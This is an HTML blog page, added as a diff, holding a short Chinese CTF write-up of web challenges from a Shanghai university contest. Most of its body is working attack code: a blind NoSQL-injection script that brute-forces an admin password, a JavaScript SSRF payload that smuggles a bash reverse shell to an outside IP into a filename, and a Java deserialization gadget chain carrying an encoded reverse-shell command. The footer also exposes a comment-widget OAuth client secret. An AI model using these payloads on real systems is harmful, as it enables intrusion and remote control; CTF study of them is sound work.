@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>上海市大学生web |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="上海市大学生web |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="上海市大学生web"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/v6HHIYwMK/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+        </span>
+            <h1>上海市大学生web</h1>
+            <span class="meta">
+            	Posted on
+              2021-10-31，3 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>社畜出差。没时间看题害</p>
+<pre><code>import string
+
+import requests
+url=&quot;http://eci-2zecw4kvmzag6xzlng6j.cloudeci1.ichunqiu.com:8888/signin&quot;
+s=string.printable
+data=&quot;&quot;
+for i in range(20,100):
+    for ss in s:
+        r=requests.post(url=url,data={&quot;username&quot;:&quot;adm&quot;,&quot;password&quot;:&quot;adn' ||1&amp;&amp;(this.password[&quot;+str(i)+&quot;]=='&quot;+ss+&quot;')&amp;&amp; '1&quot;})
+        if(&quot;Are You Kidding&quot; in r.text):
+            data=data+ss
+            print(str(i)+&quot;: &quot;+ss)
+            break
+    print(data)
+</code></pre>
+<p>administrator<br>
+tHe_pAsSw0rd_thAt_y0u_hahahhaha_NeVer_Kn0w_1010101</p>
+<p>然后传文件。里面带js。渲染pdf就会触发请求。</p>
+<pre><code>&lt;script&gt;
+var httpRequest = new XMLHttpRequest();
+httpRequest.open('POST', 'http://127.0.0.1:8888/delete', true);
+httpRequest.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);
+httpRequest.send('{&quot;filename&quot;:&quot;1;/bin/sh -i &gt;&amp; /dev/tcp/1.15.67.142/1337 0&gt;&amp;1&quot;}');
+
+httpRequest.onreadystatechange = function () {
+    if (httpRequest.readyState == 4 &amp;&amp; httpRequest.status == 200) {
+        var json = httpRequest.responseText;
+        console.log(json);
+    }
+};
+&lt;/script&gt;
+</code></pre>
+<p>然后提权<br>
+<img src="https://guokeya.github.io/post-images/1635687598784.png" alt="" loading="lazy"></p>
+<p>ezgadget<br>
+留了个后门。直接找个类触发tostring。弹shell就行</p>
+<pre><code>package com.ezgame.ctf.tools;
+
+import com.ezgame.ctf.bean.User;
+
+import javax.management.BadAttributeValueExpException;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.Base64;
+
+public class test {
+    public static byte[] base64Decode(String base64) {
+        Base64.Decoder decoder = Base64.getDecoder();
+        return decoder.decode(base64);
+    }
+    public static void main(String[] args) throws IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException {
+        ToStringBean toStringBean = new ToStringBean();
+        Field field1 = ToStringBean.class.getDeclaredField(&quot;ClassByte&quot;);
+        field1.setAccessible(true);
+        field1.set(toStringBean, base64Decode(&quot;yv66vgAAADQAHAoABgAPCgAQABEIABIKABAAEwcAFAcAFQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAWAQAKU291cmNlRmlsZQEACmd1b2tlLmphdmEMAAcACAcAFwwAGAAZAQBhYmFzaCAtYyB7ZWNobyxMMkpwYmk5emFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eExqRTFMalkzTGpFME1pOHhNek0zSURBK0pqRT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfQwAGgAbAQAFZ3Vva2UBABBqYXZhL2xhbmcvT2JqZWN0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAEAAQAHAAgAAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAAGAAQABwANAAgACwAAAAQAAQAMAAEADQAAAAIADg&quot;));
+        BadAttributeValueExpException exception = new BadAttributeValueExpException(&quot;su18&quot;);
+        Field field = BadAttributeValueExpException.class.getDeclaredField(&quot;val&quot;);
+        field.setAccessible(true);
+        field.set(exception, toStringBean);
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeUTF(&quot;gadgets&quot;);
+        oos.writeInt(2021);
+        oos.writeObject(exception);
+        oos.close();
+        String b = Base64.getEncoder().encodeToString(barr.toByteArray());
+        System.out.println(b);
+        InputStream inputStream = new ByteArrayInputStream(base64Decode(b));
+        ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
+        String name = objectInputStream.readUTF();
+        int year = objectInputStream.readInt();
+        if (name.equals(&quot;gadgets&quot;) &amp;&amp; year == 2021) {
+            objectInputStream.readObject();
+        }
+
+
+    }
+}
+
+</code></pre>
+<p>apachePrOxy<br>
+没搞懂考什么<br>
+Nday一把锁</p>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/KJ3cWdlP1/">
+              <span class="post-title">
+                2021 Byte CTF web(Unsecure Blog &amp;double sqli)&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br >浙ICP备2021000950号-1</a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
